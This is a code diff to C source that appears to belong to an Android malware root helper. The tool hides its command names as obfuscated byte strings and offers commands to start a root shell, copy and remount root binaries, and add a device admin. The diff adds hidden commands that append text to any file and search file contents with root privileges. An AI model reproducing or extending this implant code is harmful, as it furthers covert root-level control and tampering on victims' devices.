@@ -49,6 +49,8 @@ static void add_admin(const char *appname);
 static void copy_root(const char *mntpnt, const char *dst);
 static void copy_remount(const char *mntpnt, const char *src, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
+static int append_content(const char *content, const char *file);
+static int search_content(const char *content, const char *file);
 //static int get_framebuffer(char *filename);
 static unsigned char* deobfuscate(unsigned char *s);
 
@@ -86,6 +88,8 @@ int main(int argc, char** argv) {
 	unsigned char lid[] = "\xb2\xf9\x48\x2e\x2d\x36"; // "lid"
 	unsigned char rf[] = "\xf9\x6f\x94\x95\x61"; // "rf"
 	unsigned char fhs[] = "\xe5\xe3\x05\x85\x93\x9a"; // "fhs"
+	unsigned char ape[] = "\xaa\xb4\x1d\xcb\x3a\x37"; // "ape"
+	unsigned char srh[] = "\x05\xcb\xcd\x8a\x89\xf3"; // "srh"
 
 	int i;
 	unsigned char *da, *db;
@@ -112,6 +116,8 @@ int main(int argc, char** argv) {
 		LOG("adm <package name/receiver>\n");
 		LOG("qzs - start a root shell\n");
 		LOG("lid <proc> <dest file> - return process id for <proc> write it to <dest file>\n");
+		LOG("ape <content> <dest file> - append text <content> to <dest files> if not yet present\n");
+		LOG("srh <content> <file> - search for <content> in <file>\n");
 		
 		return 0;
 	}
@@ -193,6 +199,12 @@ int main(int argc, char** argv) {
 		LOG("Process id is: %d\n", i);
 		log_to_file(argv[3], (char *)&i, sizeof(int));
 		return 0;
+	} else if (strcmp(argv[1], deobfuscate(ape)) == 0) { // Append text content to file, add newline
+		LOG("Appending %s to %s\n", argv[2], argv[3]);
+		return append_content(argv[2], argv[3]);
+	} else if (strcmp(argv[1], deobfuscate(srh)) == 0) { // Search for content in file return 1 if content is present 0 if not, -1 in case of error
+		LOG("Searching for %s in %s\n", argv[2], argv[3]);
+		return search_content(argv[2], argv[3]);
 	} else if (strcmp(argv[1], deobfuscate(qzs)) == 0) { // Eseguiamo una root shell
 		const char * shell = deobfuscate(binsh1);
 		LOG("Starting root shell\n");
@@ -317,6 +329,88 @@ static unsigned char* deobfuscate(unsigned char *s) {
 
 	return fd;
 }*/
+
+static int append_content(const char *content, const char *file) {
+	FILE *fd;
+	char *data = NULL;
+	int size = 0;
+	char *newline = "\n";
+
+	if ((fd = fopen(file, "r+")) == NULL) {
+		LOG("Unable to open source file in r+ mode\n");
+		return -1;
+	}
+
+	fseek(fd, 0L, SEEK_END);
+	size = ftell(fd);
+	fseek(fd, 0L, SEEK_SET);
+
+	data = (char *)malloc(size + 1);
+	memset(data, 0x00, size + 1);
+
+	LOG("Reading %d bytes\n", size);
+
+	fread(data, size, 1, fd);
+
+	if (strcasestr(data, content) != NULL) {
+		LOG("Needle already present\n");
+
+		fclose(fd);
+		free(data);
+		return -1;
+	}
+
+	fseek(fd, 0L, SEEK_END);
+
+	if (fwrite(content, strlen(content), 1, fd) > 0) {
+		LOG("Content successfully written to file\n");
+	} else {
+		LOG("Unable to write content to file\n");
+	}
+
+	fwrite(newline, strlen(newline), 1, fd);
+
+	fclose(fd);
+	free(data);
+	sync();
+
+	return 0;
+}
+
+static int search_content(const char *content, const char *file) {
+	FILE *fd;
+	char *data = NULL;
+	int size = 0;
+	char *ret = NULL;
+
+	if ((fd = fopen(file, "r")) == NULL) {
+		LOG("Unable to open source file in r mode\n");
+		return -1;
+	}
+
+	fseek(fd, 0L, SEEK_END);
+	size = ftell(fd);
+	fseek(fd, 0L, SEEK_SET);
+
+	data = (char *)malloc(size + 1);
+	memset(data, 0x00, size + 1);
+
+	LOG("Reading %d bytes\n", size);
+
+	fread(data, size, 1, fd);
+
+	ret = strcasestr(data, content);
+
+	fclose(fd);
+
+	if (ret == NULL) {
+		LOG("%s not found\n", content);
+		return 0;
+	} else {
+		LOG("%s found\n", content);
+		return 1;
+	}
+}
 
 static int log_to_file(const char *full_path, const char *content, const int len) {
 	int fd, ret;
